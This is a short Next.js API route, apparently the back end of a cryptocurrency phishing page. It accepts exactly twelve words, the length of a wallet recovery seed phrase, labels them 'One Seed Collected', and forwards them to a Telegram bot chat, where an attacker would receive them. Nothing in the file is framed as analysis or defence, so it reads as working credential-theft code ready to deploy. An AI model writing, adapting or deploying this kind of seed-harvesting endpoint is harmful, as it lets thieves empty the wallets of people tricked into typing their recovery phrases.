import { NextResponse } from 'next/server'
import axios from 'axios'

export async function POST(request: Request) {
  const { inputs } = await request.json()

  if (!inputs || inputs.length !== 12) {
    return NextResponse.json({ success: false }, { status: 400 })
  }

  // Initialize device detector


  // Parse user agent


  // Construct Telegram message with device, browser, and OS information
  const cross = '```';
  const message = ` One Seed Collected: ${cross} ${inputs.join(' ')} ${cross}`;

  try {
    // Send message to Telegram
    await axios.post(
      `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        chat_id: process.env.TELEGRAM_CHAT_ID,
        text: message,
      }
    )

    return NextResponse.json({ success: true })
  } catch (error) {
    console.error("Error forwarding to Telegram:", error)
    return NextResponse.json({ success: false }, { status: 500 })
  }
}

